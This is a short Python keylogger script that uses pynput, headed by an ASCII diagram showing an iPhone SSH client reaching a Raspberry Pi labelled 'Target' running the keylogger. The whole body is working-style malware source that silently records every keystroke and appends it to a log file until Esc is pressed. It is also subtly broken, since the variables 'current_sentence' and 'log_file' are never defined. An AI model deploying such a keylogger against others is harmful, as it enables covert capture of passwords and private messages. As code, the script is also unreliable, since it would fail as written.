# +------------------------+       +----------------------------+
# |    iPhone with Termius |       |    Raspberry Pi (Target)   |
# |                        |       |                            |
# |   +--------------+     |       |                            |
# |   |   SSH Client  +------------->                            |
# |   +--------------+     |       |                            |
# |                        |       |   +------------------+     |
# |                        |       |   |  Python Script   |     |
# |                        |       |   | (Keylogger)      |     |
# |                        |       |   +------------------+     |
# +------------------------+       +----------------------------+

from pynput import keyboard

def on_press(key):
    global current_sentence

    try:
        char = key.char
        if char is not None:
            current_sentence += char
    except AttributeError:
        if key == keyboard.Key.space:
            current_sentence += " "
        elif key == keyboard.Key.enter:
            current_sentence += "\n"

def on_release(key):
    global current_sentence

    if key == keyboard.Key.esc:
        # Stop listener on pressing the Esc key
        return False

    with open(log_file, 'a') as f:
        f.write(current_sentence)
    current_sentence = ""

# Create a listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Start the listener
listener.start()

# Keep the script running
listener.join()


